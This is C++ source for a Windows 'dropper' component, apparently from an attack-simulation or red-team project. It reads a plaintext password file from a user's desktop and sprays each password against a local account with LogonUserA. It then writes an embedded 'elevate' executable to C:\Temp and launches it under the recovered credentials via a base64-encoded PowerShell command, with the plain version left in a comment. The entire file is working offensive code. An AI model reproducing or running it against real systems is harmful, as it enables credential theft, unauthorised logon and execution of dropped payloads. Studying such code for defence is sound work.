#include "dropper.hpp"

std::string componentName = "dropper";

int wmain() {
	Log("[+] Starting " + componentName + ".", componentName);
	Log("[*] Running as " + GetUserAndContext(), componentName);

	// TODO: simulate attacker looking for password docs with powershell

	// read passwords in doc
	Log("[+] Reading password doc.", componentName);
	std::ifstream file;
	file.open(L"C:\\Users\\NineBall\\Desktop\\notmypasswords.txt", std::ios::in);
	std::vector<std::string> passList;
	std::string pass;

	if (file.is_open()) {
		std::string s;
		while (std::getline(file, s)) {
			passList.push_back(s.substr(s.find(":") + 2));
		}
	}
	file.close();

	// attempt to authenticate as NineBall with passwords
	Log("[+] Starting password spray.", componentName);
	HANDLE hToken = NULL;
	for (std::string s : passList) {
		Log("  [*] Trying password \"" + s + "\"", componentName);
		if (LogonUserA(
			"NineBall",
			".",
			s.c_str(),
			LOGON32_LOGON_NETWORK,
			LOGON32_PROVIDER_DEFAULT,
			&hToken
		)) {
			pass = s;
			break;
		}
	}

	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
		Log("[!] Failed to get NineBall token" + std::to_string(GetLastError()), componentName);
	}

	Log("[*] Valid password: \"" + pass + "\"", componentName);

	// write elevate to disk
	Log("[+] Writing elevate to disk.", componentName);
	std::ofstream outfile("C:\\Temp\\elevate.exe", std::ios::out | std::ios::binary);
	outfile.write(&elevate[0], sizeof(elevate));
	outfile.close();

	// create elevate process as NineBall
	Log("[+] Starting elevate.", componentName);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	//std::wstring cmd = 
	//	L"powershell.exe -Command "
	//	L"$username = 'NineBall'; "
	//	L"$password = 'SuperSecurePassword1!'; "
	//	L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
	//	L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
	//	L"Start-Process C:\\Temp\\elevate.exe -Credential $credential;";

	std::wstring cmd = L"powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBOAGkAbgBlAEIAYQBsAGwAJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBTAHUAcABlAHIAUwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADEAIQAnADsAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAAgAD0AIABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJABwAGEAcwBzAHcAbwByAGQAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlADsAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQwByAGUAZABlAG4AdABpAGEAbAAgACQAdQBzAGUAcgBuAGEAbQBlACwAIAAkAHMAZQBjAHUAcgBlAFAAYQBzAHMAdwBvAHIAZAA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFwAVABlAG0AcABcAFwAZQBsAGUAdgBhAHQAZQAuAGUAeABlACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAGUAbgB0AGkAYQBsADsA";

	if (!CreateProcessW(
		NULL,
		const_cast<LPWSTR>(cmd.c_str()),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		Log("[!] Failed to create elevate process." + std::to_string(GetLastError()), componentName);
	}
	else {
		Log("[+] Successfully created elevate process.", componentName);
	}

	// unsure if these will cause dropper to stay up
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}